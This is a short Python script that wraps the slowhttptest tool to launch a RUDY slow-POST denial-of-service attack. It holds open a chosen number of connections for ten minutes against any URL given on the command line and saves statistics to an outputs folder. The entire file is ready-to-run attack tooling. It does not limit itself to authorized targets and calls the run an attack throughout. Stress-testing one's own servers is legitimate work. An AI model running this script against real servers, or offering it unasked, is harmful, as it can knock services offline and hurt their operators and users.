import subprocess
import sys
import os

def run_slowhttptest(connections, url):
    # Create the outputs folder if it does not exist
    if not os.path.exists("outputs"):
        os.makedirs("outputs")
    
    # Construct the command for SlowHTTPTest
    command = [
        "slowhttptest",  # The SlowHTTPTest command
        "-c", str(connections),  # Number of concurrent connections
        "-B",  # Use the RUDY (slow POST) attack
        "-g",  # Generate statistics
        "-o", "outputs/rudy",  # Output files in the 'outputs' folder with prefix 'slowhttp'
        "-i", "1",  # Interval between data chunks (in seconds)
        "-r", "2000",  # Rate of sending data (bytes per second)
        "-s", "100000",  # Size of POST data (bytes)
        "-l", "600",  # Duration of the attack (seconds)
        "-t", "POST",  # HTTP method (POST)
        "-u", url  # Target URL
    ]
    
    # Run the SlowHTTPTest command
    try:
        print(f"Running SlowHTTPTest with {connections} concurrent connections on {url}...")
        subprocess.run(command, check=True)
        print("Attack completed successfully. Output saved in 'outputs' folder.")
    except subprocess.CalledProcessError as e:
        print(f"Error running the attack: {e}")
        sys.exit(1)

if __name__ == "__main__":
    # Check if correct number of arguments is provided
    if len(sys.argv) != 3:
        print("Usage: python3 rudy.py <number_of_connections> <target_url>")
        sys.exit(1)
    
    # Parse the command line arguments
    connections = int(sys.argv[1])  # Number of concurrent connections
    url = sys.argv[2]  # Target URL
    
    # Run the SlowHTTPTest attack
    run_slowhttptest(connections, url)
